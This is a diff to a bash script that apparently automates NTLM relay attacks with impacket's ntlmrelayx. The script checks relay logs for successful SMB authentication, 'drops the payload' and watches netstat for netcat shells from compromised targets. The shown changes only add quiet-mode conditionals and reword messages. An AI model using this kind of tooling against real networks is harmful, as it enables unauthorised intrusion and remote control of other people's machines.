@@ -127,7 +127,7 @@ function checkProgramsNeeded(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.3; fi
 	which apt &>/dev/null
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} No apt? Where are you running me?!\n"; badExit; fi
+	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Wait... no apt? Where are you running me?!\n"; badExit; fi
 	apt update &>/dev/null
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.3; fi
@@ -218,13 +218,13 @@ function checkTargets(){
 
 	while read line; do
 		if [ "$(netstat -tunalp | grep '\/nc' | grep 'ESTABLISHED' | grep "$line")" != "" ];then
-			echo -e "\t${yellowColour}[-,-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"
+			if [ ! -z $quiet ];then echo -e "\t${yellowColour}[-,-]${endColour} You already have a shell at $line! Please do not bully and remove it from targets.\n"; fi
 			echo $line >> $(pwd)/impacket/hostsStatus.tmp
 		fi
 	done < $(pwd)/impacket/targets.txt
 
 	if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
-		echo -e "${greenColour}[:D]${endColour} Wow! All targets pwned! You really are a H4X0R!\n"; goodExit
+		if [ ! -z $quiet ];then echo -e "${greenColour}[:D]${endColour} Wow! All targets pwned! You really are a H4X0R!\n"; goodExit; fi
 	fi
 
 }
@@ -285,14 +285,14 @@ function targetStatus(){
 	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log 2>/dev/null | tail -1 | awk '{print $NF}')
 
 	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
-		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2
+		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2; fi
 		
 		if [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
-			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"
+			if [ ! -z $quiet ];then echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"; fi
 			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 		else echo; fi
 	elif [ "$status" == "FAILED" ];then
-		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3
+		if [ ! -z $quiet ];then echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3; fi
 		echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 	fi
 
@@ -404,7 +404,7 @@ function relayingAttack(){
 		done < $(pwd)/impacket/targets.txt
 
 		if [[ "$(wc -l $(pwd)/impacket/hostsStatus.tmp 2>/dev/null | awk '{print $1}')" == "$(wc -l $(pwd)/impacket/targets.txt 2>/dev/null | awk '{print $1}')" ]];then
-			echo -e "\t${redColour}[:(]${endColour} No targets left! Go find more!\n"; break
+			echo -e "\t${redColour}[:(]${endColour} No targets left to perform the realy! Go find more!\n"; break
 		fi
 		portStatus=$(netstat -tnualp | grep '/nc' | grep "$lport" | tail -1 | awk '{print $6}');
 	done
